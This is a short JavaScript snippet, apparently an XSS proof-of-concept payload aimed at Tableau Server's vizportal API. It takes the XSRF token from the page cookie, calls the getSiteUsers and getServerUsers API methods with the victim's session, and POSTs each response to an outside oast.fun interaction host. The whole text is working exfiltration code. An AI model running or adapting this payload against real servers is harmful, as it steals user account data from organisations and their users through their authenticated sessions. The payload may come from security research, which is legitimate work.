const serverName = "umgpolhujnhqshdcndse241f7736felnk.oast.fun";

async function exfiltrate(methodName) {
  let res = await fetch(
      `/vizportal/api/web/v1/${methodName}`, {
          headers: {
              "x-xsrf-token": document.cookie.split('=')[1] // assumes CSRF cookie is at the end
          },
          body: JSON.stringify({method:methodName, params:{}}),
          method: "POST",
      }
  );
  await fetch(
      serverName, {
          body: await res.text(),
          method: "POST",
          mode: "no-cors",
      }
  );
}

exfiltrate("getSiteUsers");
exfiltrate("getServerUsers");
